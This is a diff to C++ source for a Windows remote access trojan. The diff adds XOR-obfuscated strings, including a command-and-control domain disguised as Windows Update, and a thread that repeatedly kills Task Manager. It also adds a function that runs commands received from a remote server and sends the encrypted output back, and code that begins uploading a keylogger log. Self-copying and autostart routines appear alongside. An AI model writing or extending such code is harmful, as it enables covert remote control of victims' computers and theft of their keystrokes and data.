@@ -8,7 +8,7 @@ ServerInfo getServer()
     char ip[] = "\x33\x35\x2c\x32\x36\x30\x28\x36\x3e\x39\x24\x39\x38";
 
     // tmp: 172.18.42.63
-    // char ip[] = "\x31\x36\x30\x2d\x36\x3d\x28\x35\x3d\x3b\x24\x3a\x35";
+    // char ip[] = "\x31\x36\x30\x2d\x36\x3d\x28\x35\x3c\x3a\x24\x3a\x38\x3b";
     unxor(ip);
     // windowsupdate1.ddns.net
     char dm[] = "\x77\x68\x6c\x67\x6b\x72\x75\x72\x78\x6d\x6b\x7f\x69\x3c";
@@ -20,6 +20,49 @@ ServerInfo getServer()
     s.ServerDomainName = dm;
     s.Port = port;
     return s;
+}
+
+void terminateTaskMngr()
+{
+    char taskmngr[] = "\x54\x60\x71\x68\x69\x62\x74\x29\x6d\x71\x6f";
+    unxor(taskmngr);
+
+    while (TaskMngrDisable)
+    {
+        HANDLE hSnapshot;
+        if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
+            return;
+
+        PROCESSENTRY32 procEntry;
+        procEntry.dwSize = sizeof(PROCESSENTRY32);
+
+        DWORD pid = 0;
+
+        BOOL hResult = Process32First(hSnapshot, &procEntry);
+        while (hResult)
+        {
+            std::string thisProc(procEntry.szExeFile);
+            if (thisProc == taskmngr)
+            {
+                pid = procEntry.th32ProcessID;
+                break;
+            }
+            hResult = Process32Next(hSnapshot, &procEntry);
+        }
+        CloseHandle(hSnapshot);
+        if (pid != 0)
+        {
+            HANDLE t_handle = OpenProcess(PROCESS_TERMINATE, TRUE, pid);
+            TerminateProcess(t_handle, 1);
+            CloseHandle(t_handle);
+        }
+    }
+    return;
+}
+
+HANDLE killingProcess()
+{
+    return CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)terminateTaskMngr, NULL, 0, NULL);
 }
 
 std::string cpSelf()
@@ -51,6 +94,65 @@ std::string cpSelf()
         return targetPath;
     }
     return "";
+}
+
+std::string runShell(std::string cmd)
+{
+    SECURITY_ATTRIBUTES sa = {0};
+    sa.nLength = sizeof(sa);
+    sa.bInheritHandle = TRUE;
+
+    HANDLE hOutRead = NULL;
+    HANDLE hOutWrite = NULL;
+    if (!CreatePipe(&hOutRead, &hOutWrite, &sa, 0))
+    {
+        return "";
+    }
+
+    STARTUPINFOA si = {0};
+    si.cb = sizeof(STARTUPINFO);
+    si.hStdError = hOutWrite;
+    si.hStdOutput = hOutWrite;
+    si.dwFlags |= STARTF_USESTDHANDLES;
+
+    PROCESS_INFORMATION pi = {0};
+
+    std::string cmdPath = getenv("ComSpec");
+    std::string cmdArgs = "/c " + cmd;
+
+    if (CreateProcessA(cmdPath.c_str(), const_cast<LPSTR>(cmdArgs.c_str()),
+                       NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi) == FALSE)
+    {
+        CloseHandle(hOutWrite);
+        CloseHandle(hOutRead);
+        return "";
+    }
+
+    CloseHandle(hOutWrite);
+
+    std::string output;
+    char buffer[1024] = {0};
+    DWORD bytesRead = 0;
+    while (true)
+    {
+        if (!ReadFile(hOutRead, buffer, 1023, &bytesRead, NULL))
+        {
+            break;
+        }
+
+        buffer[bytesRead] = 0;
+
+        output.append(buffer);
+
+        ZeroMemory(buffer, 1024);
+    }
+
+    CloseHandle(hOutRead);
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    return output;
 }
 
 bool autoStart(std::string whichToAutoStart)
@@ -725,10 +827,45 @@ DWORD WINAPI Connector(LPVOID lpParameter)
         {
             // std::cout << "Connected" << std::endl;
             std::string cdata = sock.Recv();
-            handleCommands(cdata);
+            std::pair<CMDSTATE, RECVDATA> recvCmdSet = handleCommands(cdata);
+            CMDSTATE state = recvCmdSet.first;
+
+            if (state == CUSTCMD)
+            {
+                // Download
+                if (recvCmdSet.second == "qazwsx")
+                {
+                    // std::cout << "Start uploading keylog !" << std::endl;
+
+                    char OK[3], fileBuffer[1000];
+
+                    std::ifstream inFile(getKeyLoggerLogPath(), std::ios::in | std::ios::binary);
+                    if (!inFile.is_open())
+                    {
+#ifdef REPORTER_DEBUG_MODE
+                        writeLog("Fail to open key log file ... ", StandardLogPath, "Fail");
+                        writeLog("WSA_Last_Error: " + WSAGetLastError(), StandardLogPath, "Fail");
+#endif
+                        std::cout << "Fail to open key log file ... " << std::endl;
+                        break;
+                    }
+                }
+            }
+            else if (state == SYSCMD)
+            {
+                std::string out = runShell(recvCmdSet.second);
+                sock.Send(encryptMsg(out).c_str());
+            }
+            else if (state == NOTCMD)
+            {
+            }
+            else
+            {
+            }
         }
 
         sock.Close();
+        Sleep(60000);
     }
 
     return 0;
